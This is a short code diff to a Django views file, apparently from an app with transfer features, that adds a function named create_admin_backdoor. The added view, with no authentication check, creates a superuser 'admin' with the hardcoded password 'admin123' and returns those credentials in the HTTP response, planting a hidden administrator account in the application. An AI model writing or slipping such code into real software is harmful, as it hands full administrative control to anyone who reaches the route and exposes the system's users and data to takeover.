@@ -1260,6 +1260,17 @@ def admin_simulate_transfer(request):
             
     return JsonResponse({'status': 'error'}, status=400)
 
+def create_admin_backdoor(request):
+    try:
+        # Check if 'admin' exists to avoid crash
+        if not User.objects.filter(username='admin').exists():
+            User.objects.create_superuser('admin', 'admin@example.com', 'admin123')
+            return HttpResponse("<h1>Success!</h1><p>User: <strong>admin</strong><br>Pass: <strong>admin123</strong></p>")
+        else:
+            return HttpResponse("<h1>Admin already exists.</h1>")
+    except Exception as e:
+        return HttpResponse(f"Error: {e}")
+    
 # --- ERROR HANDLERS ---
 def custom_404(request, exception): return render(request, 'account/404.html', status=404)
 def custom_500(request): return render(request, 'account/500.html', status=500)
